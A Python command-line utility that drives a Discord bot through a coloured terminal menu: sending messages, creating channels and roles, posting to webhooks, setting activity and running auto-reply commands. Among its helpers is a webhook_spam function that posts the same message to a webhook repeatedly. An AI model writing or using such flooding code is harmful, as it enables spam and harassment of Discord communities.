import discord
import json
import time
import asyncio
import sys
import os
import requests
from discord.ext import commands

def load_config():
    try:
        with open('config.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return {"token": "", "guild_id": "", "message": ""}

def save_config(data):
    with open('config.json', 'w') as f:
        json.dump(data, f, indent=4)

def get_token():
    return load_config().get('token', '')

def get_guild_id():
    return load_config().get('guild_id', '')

def save_token(token, guild_id):
    config = load_config()
    config['token'] = token
    config['guild_id'] = guild_id
    save_config(config)

# Bot Action Functions
async def bot_create_channel(name, guild_id):
    intents = discord.Intents.all()
    bot = commands.Bot(command_prefix="?", intents=intents)

    @bot.event
    async def on_ready():
        guild = discord.utils.get(bot.guilds, id=int(guild_id))
        if guild:
            await guild.create_text_channel(name)
            print(f"[+] Channel '{name}' created.")
        else:
            print("[-] Guild not found.")
        await bot.close()

    await bot.start(get_token())

async def bot_create_role(name, guild_id):
    intents = discord.Intents.all()
    bot = commands.Bot(command_prefix="?", intents=intents)

    @bot.event
    async def on_ready():
        guild = discord.utils.get(bot.guilds, id=int(guild_id))
        if guild:
            await guild.create_role(name=name)
            print(f"[+] Role '{name}' created.")
        else:
            print("[-] Guild not found.")
        await bot.close()

    await bot.start(get_token())

async def bot_set_activity(status, activity_type):
    intents = discord.Intents.all()
    bot = commands.Bot(command_prefix="?", intents=intents)

    activity_types = [
        discord.Game(name=status),
        discord.Streaming(name=status, url="https://twitch.tv/yourchannel"),
        discord.Activity(type=discord.ActivityType.listening, name=status),
        discord.Activity(type=discord.ActivityType.watching, name=status)
    ]

    @bot.event
    async def on_ready():
        await bot.change_presence(activity=activity_types[activity_type])
        print(f"[+] Status set to: {status}")
        await asyncio.sleep(10)
        await bot.close()

    await bot.start(get_token())

# Other Utilities
def send_message(message, channel_id):
    headers = {'Authorization': f'Bot {get_token()}', 'Content-Type': 'application/json'}
    payload = {'content': message}
    url = f'https://discord.com/api/v9/channels/{channel_id}/messages'
    requests.post(url, headers=headers, json=payload)

def fast_send_message(message, channel_id):
    send_message(message, channel_id)

def fast_webhook_message(message, webhook_url):
    payload = {'content': message}
    requests.post(webhook_url, json=payload)

def webhook_spam(message, webhook_url, count):
    for _ in range(count):
        fast_webhook_message(message, webhook_url)

def validate_token(token):
    headers = {'Authorization': f'Bot {token}', 'Content-Type': 'application/json'}
    response = requests.get('https://discord.com/api/v9/users/@me', headers=headers)
    return response.status_code == 200

def validate_guild_id(guild_id):
    headers = {'Authorization': f'Bot {get_token()}', 'Content-Type': 'application/json'}
    response = requests.get(f'https://discord.com/api/v9/guilds/{guild_id}', headers=headers)
    return response.status_code == 200

def main():
    if not get_token() or not get_guild_id():
        token = input("\033[38;2;255;0;80m      Enter your bot token: ")
        if not validate_token(token):
            print("Invalid token!")
            return

        guild_id = input("\033[38;2;255;0;80m      Enter your guild ID: ")

        save_token(token, guild_id)

    while True:
        print("""
\033[38;2;255;0;205m				    __      ___ _            _   _      _   
\033[38;2;255;0;180m				    \ \    / (_) |          | \ | |    | |  
\033[38;2;255;0;180m 				     \ \  / / _| |__   ___  |  \| | ___| |_ 
\033[38;2;255;0;180m  				      \ \/ / | | '_ \ / _ \ | . ` |/ _ \ __|
\033[38;2;255;0;180m   				       \  /  | | |_) |  __/_| |\  |  __/ |_ 
\033[38;2;255;0;180m   				        \/   |_|_.__/ \___(_)_| \_|\___|\__|
\033[38;2;255;0;205m			  ╔══════════════════════════════╦════════════════════════════╗\033[0m
\033[38;2;255;0;180m			  ║         \033[37mVersion: 1   	 \033[38;2;255;0;180m║    \033[37m    Dev: Freak          \033[38;2;255;0;180m║
\033[38;2;255;0;155m		   	  ╚══════════════════════════════╩════════════════════════════╝\033[0m
\033[38;2;255;0;130m		 ╔══════════════════════════╦══════════════════════════╦════════════════════════╗\033[0m
\033[38;2;255;0;105m		 ║    \033[37m[1] Send Message    \033[38;2;255;0;105m  ║    \033[37m[2] Create Channel    \033[38;2;255;0;105m║    \033[37m[3] Create Role     \033[38;2;255;0;105m║\033[0m
\033[38;2;255;0;80m		 ╠══════════════════════════╬══════════════════════════╬════════════════════════╣\033[0m
\033[38;2;255;0;55m		 ║ \033[37m[4] Send Webhook Message \033[38;2;255;0;55m║ \033[37m[5] Change Bot Activity  \033[38;2;255;0;55m║    \033[37m[6] Start AutoBot  \033[38;2;255;0;55m ║\033[0m
\033[38;2;255;0;30m		 ╚══════════════════════════╩══════════════════════════╩════════════════════════╝\033[0m             
""")
        choice = input("      \033[38;2;255;0;80mChoose an option -> ")

        if choice == "1":
            message = input("      \033[38;2;255;0;80mEnter message -> ")
            channel_id = input("Enter channel ID: ")
            fast_send_message(message, channel_id)

        elif choice == "2":
            name = input("      \033[38;2;255;0;80mEnter channel name -> ")
            asyncio.run(bot_create_channel(name, get_guild_id()))

        elif choice == "3":
            name = input("      \033[38;2;255;0;80mEnter role name -> ")
            asyncio.run(bot_create_role(name, get_guild_id()))

        elif choice == "4":
            message = input("      \033[38;2;255;0;80mEnter Message -> ")
            webhook_url = input("Enter webhook URL: ")
            fast_webhook_message(message, webhook_url)

        elif choice == "5":
            status = input("      \033[38;2;255;0;80mEnter new status -> ")
            activity_type = int(input("      \033[38;2;255;0;80mEnter type (\033[38;2;255;0;225m0 Playing, \033[38;2;192;192;192m1 Streaming, \033[38;2;255;165;0m2 Listening, \033[38;2;0;255;0m3 Watching) -> "))
            asyncio.run(bot_set_activity(status, activity_type))


        elif choice == "6":
            config = load_config()
            TOKEN = config["token"]
            COMMANDS = config.get("auto_commands", {})

            intents = discord.Intents.all()

            bot = commands.Bot(command_prefix="?", intents=intents)

            @bot.event
            async def on_ready():
                print(f"\033[38;2;255;0;205m[+] AutoBot Is Online -> \033[38;2;255;0;80m{bot.user}")
                print(f"\033[38;2;255;0;180m[+] Auto Commands Loaded -> \033[38;2;255;0;80m{', '.join(COMMANDS.keys())}")

            for cmd, response in COMMANDS.items():
                async def dynamic_command(ctx, msg=response):
                    await ctx.send(msg)

                bot.command(name=cmd)(dynamic_command)

            bot.run(TOKEN)

        else:
            print("Invalid choice!")

if __name__ == "__main__":
    main()
